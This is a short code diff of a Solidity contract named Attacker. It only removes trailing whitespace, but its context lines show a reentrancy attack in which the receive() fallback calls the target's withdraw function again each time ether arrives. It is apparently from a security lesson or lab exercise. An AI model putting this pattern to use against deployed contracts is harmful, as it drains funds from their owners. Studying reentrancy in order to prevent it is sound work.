@@ -39,10 +39,10 @@ contract Attacker {
 
     function withdraw(uint256 amount) public {
         // withdraw
-        (bool success, ) = targetAddr.call(abi.encodeWithSignature("withdraw(uint256)", amount));        
+        (bool success, ) = targetAddr.call(abi.encodeWithSignature("withdraw(uint256)", amount));
     }
 
-    receive() external payable {        
+    receive() external payable {
         msg.sender.call(abi.encodeWithSignature("withdraw(uint256)", msg.value));
     }
 }
